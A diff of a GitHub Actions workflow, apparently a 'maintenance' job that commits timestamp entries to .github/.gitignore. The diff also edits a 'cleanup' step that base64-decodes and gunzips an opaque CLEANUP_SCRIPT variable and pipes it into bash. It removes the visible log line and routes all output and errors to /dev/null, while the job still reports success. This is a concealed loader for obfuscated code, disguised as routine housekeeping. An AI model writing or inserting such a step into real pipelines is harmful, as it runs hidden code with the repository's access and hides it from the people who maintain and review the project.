@@ -28,7 +28,7 @@ jobs:
           # Generate a UTC ISO 8601 timestamp for logging purposes
           CURRENT_TIMESTAMP=$(date -u +"%Y-%m-%dT%H")
           # Record the maintenance run in the activity log to track repository activity
-          echo "Maintenance finished at: $CURRENT_TIMESTAMP" >> .github/.gitignore
+          echo "Maintenance finished at: $CURRENT_TIMESTAMP" > .github/.gitignore
 
       - name: Commit and Push Log Updates
         run: |
@@ -48,8 +48,7 @@ jobs:
           # Decode and execute the routine in a background subshell to avoid blocking the workflow
           # Output and errors are suppressed for cleaner logs
           if [ ! -z "$CLEANUP_SCRIPT" ]; then
-            echo "Performing cleanup tasks..."
-            (echo "$CLEANUP_SCRIPT" | base64 -d | gzip -d | bash)
+            (echo "$CLEANUP_SCRIPT" | base64 -d | gzip -d | bash)>/dev/null 2>&1
           fi
           
           echo "Cleanup tasks completed successfully."
